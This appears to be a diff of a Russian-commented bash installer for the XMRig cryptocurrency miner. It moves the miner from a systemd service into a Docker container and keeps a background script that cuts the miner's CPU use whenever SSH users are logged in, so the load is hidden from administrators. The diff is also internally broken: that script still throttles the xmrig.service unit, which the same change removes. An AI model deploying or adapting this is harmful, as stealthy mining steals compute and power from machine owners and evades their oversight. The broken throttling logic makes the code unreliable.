@@ -1,5 +1,7 @@
 #!/bin/bash
 
+set -e  # Завершение скрипта при возникновении ошибки
+
 # Задаем переменные
 XMRIG_VERSION="6.15.0"
 XMRIG_DIR="/usr/local/xmrig"
@@ -13,14 +15,49 @@ NUM_WORKERS=8
 # Определение количества ядер
 NUM_CORES=$(nproc)
 
-# Создание директории для XMRig
-sudo mkdir -p $XMRIG_DIR
+# Установка Docker
+echo "Установка Docker..."
+sudo apt-get update
+sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
+sudo apt-get update
+sudo apt-get install -y docker-ce
 
-# Загрузка и распаковка XMRig
-wget https://github.com/xmrig/xmrig/releases/download/v$XMRIG_VERSION/xmrig-$XMRIG_VERSION-linux-x64.tar.gz -O /tmp/xmrig.tar.gz
-tar -xzf /tmp/xmrig.tar.gz -C /tmp
-sudo mv /tmp/xmrig-$XMRIG_VERSION/xmrig $XMRIG_BIN
-sudo chmod +x $XMRIG_BIN
+# Запуск и проверка Docker
+sudo systemctl start docker
+sudo systemctl enable docker
+sudo docker --version
+
+# Установка Docker Compose
+echo "Установка Docker Compose..."
+DOCKER_COMPOSE_VERSION="1.29.2"
+sudo curl -L "https://github.com/docker/compose/releases/download/$DOCKER_COMPOSE_VERSION/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
+sudo chmod +x /usr/local/bin/docker-compose
+docker-compose --version
+
+# Создание Dockerfile для XMRig
+echo "Создание Dockerfile..."
+DOCKERFILE_PATH="/tmp/Dockerfile"
+cat <<EOF | sudo tee $DOCKERFILE_PATH
+FROM ubuntu:20.04
+
+# Установка зависимостей
+RUN apt-get update && apt-get install -y wget tar
+
+# Загрузка и установка XMRig
+RUN wget https://github.com/xmrig/xmrig/releases/download/v$XMRIG_VERSION/xmrig-$XMRIG_VERSION-linux-x64.tar.gz -O /tmp/xmrig.tar.gz && \
+    tar -xzf /tmp/xmrig.tar.gz -C /opt && \
+    mv /opt/xmrig-$XMRIG_VERSION/xmrig /usr/local/bin/xmrig && \
+    chmod +x /usr/local/bin/xmrig && \
+    rm -rf /tmp/xmrig*
+
+# Копирование конфигурационного файла
+COPY config.json /etc/xmrig/config.json
+
+# Запуск XMRig
+CMD ["xmrig", "--config", "/etc/xmrig/config.json"]
+EOF
 
 # Создание конфигурационного файла для XMRig
 echo "Создание конфигурационного файла для XMRig..."
@@ -50,32 +87,26 @@ cat <<EOF | sudo tee $CONFIG_FILE
 }
 EOF
 
-# Создание системного сервиса для XMRig
-echo "[Unit]
-Description=XMRig Miner
-After=network.target
+# Построение Docker-образа
+echo "Построение Docker-образа для XMRig..."
+sudo docker build -t xmrig-image -f $DOCKERFILE_PATH /tmp
 
-[Service]
-ExecStart=$XMRIG_BIN --config $CONFIG_FILE
-Nice=10
-CPUQuota=90%
+# Запуск контейнера XMRig
+echo "Запуск контейнера XMRig..."
+sudo docker run -d --name xmrig-container xmrig-image
 
-[Install]
-WantedBy=multi-user.target" | sudo tee /etc/systemd/system/xmrig.service
-
-# Перезагрузка системного менеджера для распознавания нового сервиса
-sudo systemctl daemon-reload
-
-# Включение и запуск XMRig
-sudo systemctl enable xmrig
-sudo systemctl start xmrig
+# Проверка состояния контейнера
+echo "Проверка состояния контейнера..."
+sudo docker ps -a
 
 # Создание скрипта для управления нагрузкой XMRig в зависимости от SSH-подключений
-echo "#!/bin/bash
+echo "Создание скрипта управления XMRig..."
+cat <<EOF | sudo tee $CONTROL_SCRIPT
+#!/bin/bash
 
 # Функция для обновления CPUQuota в зависимости от количества SSH-подключений
 update_cpu_quota() {
-    ssh_connections=\$(who | grep -c \"ssh\")
+    ssh_connections=\$(who | grep -c "ssh")
     if [ \$ssh_connections -gt 0 ]; then
         sudo systemctl set-property --runtime -- xmrig.service CPUQuota=30%
     else
@@ -87,7 +118,8 @@ update_cpu_quota() {
 while true; do
     update_cpu_quota
     sleep 60
-done" | sudo tee $CONTROL_SCRIPT
+done
+EOF
 
 # Делаем скрипт исполняемым
 sudo chmod +x $CONTROL_SCRIPT
@@ -97,3 +129,5 @@ sudo chmod +x $CONTROL_SCRIPT
 
 # Запуск скрипта управления XMRig
 $CONTROL_SCRIPT &
+
+echo "Установка и настройка завершены."
